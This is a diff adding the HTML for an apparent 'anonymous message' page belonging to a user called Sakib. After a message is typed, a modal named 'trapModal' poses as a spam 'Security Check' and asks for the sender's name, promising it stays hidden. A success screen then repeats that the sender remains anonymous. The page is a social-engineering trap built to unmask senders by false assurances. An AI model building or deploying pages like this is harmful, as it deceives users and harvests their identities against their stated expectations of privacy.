@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send me a message!</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="profile-section">
+         <div class="avatar">
+    <img src="profile.jpeg" alt="Sakib" style="width: 100%; height: 100%; border-radius: 50%; object-fit: cover;">
+</div>
+                <h3>@sakib73209</h3>
+                <p>send me anonymous messages!</p>
+            </div>
+            
+            <textarea id="userMessage" placeholder="send me anonymous messages..."></textarea>
+            
+            <button id="sendBtn" onclick="openVerification()">Send!</button>
+        </div>
+    </div>
+
+    <div id="trapModal" class="modal">
+        <div class="modal-content">
+            <h4>Security Check</h4>
+            <p>To prevent spam, please enter your name. Your name will remain hidden from the receiver.</p>
+            <input type="text" id="senderName" placeholder="Your Name">
+            <button onclick="submitData()">Verify & Send</button>
+        </div>
+    </div>
+
+    <div id="successModal" class="modal">
+        <div class="modal-content" style="background: #161b22; border: 1px solid #2ea44f;">
+            <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
+            <h4 style="color: white;">Sent!</h4>
+            <p style="color: #8b949e;">Your identity remains anonymous to Sakib.</p>
+            <button onclick="closeSuccess()" style="background: #2ea44f; margin-top: 15px; color: white;">OK</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
